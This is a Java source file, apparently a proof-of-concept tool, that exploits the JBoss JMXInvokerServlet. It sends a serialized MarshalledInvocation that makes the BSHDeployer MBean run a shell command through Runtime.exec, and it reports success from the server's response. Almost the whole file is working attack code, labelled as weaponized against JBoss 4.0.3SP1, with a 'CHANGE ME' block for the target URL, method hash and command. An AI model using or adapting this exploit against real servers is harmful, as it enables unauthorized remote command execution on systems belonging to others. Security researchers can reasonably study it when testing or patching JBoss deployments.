/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package javaapplication40;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.ConnectException;
import java.net.HttpURLConnection;
import java.net.URL;
import javax.management.MalformedObjectNameException;
import javax.management.ObjectName;
import org.jboss.invocation.MarshalledInvocation; //within jboss.jar (look into the original JBoss installation dir)
/**
 *
 * @author HoangThong
 */
public class JMXInvokerServlet {

    //---------> CHANGE ME <---------
    static final int hash = 647347722; //Weaponized against JBoss 4.0.3SP1
    static final String url = "http://192.168.217.173:8080/invoker/JMXInvokerServlet";
    static final String cmd = "touch /tmp/exectest";
    //-------------------------------

    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, MalformedObjectNameException {

        System.out.println("\n--[ JBoss JMXInvokerServlet Remote Command Execution ]");

        //Create a malicious Java serialized object
        MarshalledInvocation payload = new MarshalledInvocation();
        payload.setObjectName(new Integer(hash));

        //Executes the MBean invoke operation
        Class<?> c = Class.forName("javax.management.MBeanServerConnection");
        Method method = c.getDeclaredMethod("invoke", javax.management.ObjectName.class, java.lang.String.class, java.lang.Object[].class, java.lang.String[].class);
        payload.setMethod(method);

        //Define MBean's name, operation and pars
        Object myObj[] = new Object[4];
        //MBean object name
        myObj[0] = new ObjectName("jboss.deployer:service=BSHDeployer");
        //Operation name
        myObj[1] = new String("createScriptDeployment");
        //Actual parameters
        myObj[2] = new String[]{"Runtime.getRuntime().exec(\"" + cmd + "\");", "Script Name"};
        //Operation signature
        myObj[3] = new String[]{"java.lang.String", "java.lang.String"};

        payload.setArguments(myObj);
        System.out.println("\n--[*] MarshalledInvocation object created");
        //For debugging - visualize the raw object
        //System.out.println(dump(payload));

        //Serialize the object
        try {
            //Send the payload
            URL server = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) server.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setUseCaches(false);
            conn.setRequestProperty("Accept", "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2");
            conn.setRequestProperty("Connection", "keep-alive");
            conn.setRequestProperty("User-Agent", "Java/1.6.0_06");
            conn.setRequestProperty("Content-Type", "application/octet-stream");
            conn.setRequestProperty("Accept-Encoding", "x-gzip,x-deflate,gzip,deflate");
            conn.setRequestProperty("ContentType", "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledInvocation");

            ObjectOutputStream wr = new ObjectOutputStream(conn.getOutputStream());
            wr.writeObject(payload);
            System.out.println("\n--[*] MarshalledInvocation object serialized");
            System.out.println("\n--[*] Sending payload...");
            wr.flush();
            wr.close();

            //Get the response
            InputStream is = conn.getInputStream();
            BufferedReader rd = new BufferedReader(new InputStreamReader(is));
            String line;
            StringBuffer response = new StringBuffer();
            while ((line = rd.readLine()) != null) {
                response.append(line);
            }
            rd.close();

            if (response.indexOf("Script Name") != -1) {
                System.out.println("\n--[*] \"" + cmd + "\" successfully executed");
            } else {
                System.out.println("\n--[!] An invocation error occured...");
            }
        } catch (ConnectException cex) {
            System.out.println("\n--[!] A connection error occured...");
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }

    /*
     * Raw dump of generic Java Objects
     */
    static String dump(Object o) {
        StringBuffer buffer = new StringBuffer();
        Class oClass = o.getClass();

        if (oClass.isArray()) {
            buffer.append("[");

            for (int i = 0; i < Array.getLength(o); i++) {
                if (i > 0) {
                    buffer.append(",\n");
                }
                Object value = Array.get(o, i);
                buffer.append(value.getClass().isArray() ? dump(value) : value);
            }
            buffer.append("]");
        } else {
            buffer.append("{");
            while (oClass != null) {
                Field[] fields = oClass.getDeclaredFields();
                for (int i = 0; i
                        < fields.length; i++) {
                    if (buffer.length() > 1) {
                        buffer.append(",\n");
                    }
                    fields[i].setAccessible(true);
                    buffer.append(fields[i].getName());
                    buffer.append("=");
                    try {
                        Object value = fields[i].get(o);
                        if (value != null) {
                            buffer.append(value.getClass().isArray() ? dump(value) : value);
                        }
                    } catch (IllegalAccessException e) {
                    }
                }
                oClass = oClass.getSuperclass();
            }
            buffer.append("}");
        }
        return buffer.toString();
    }
}
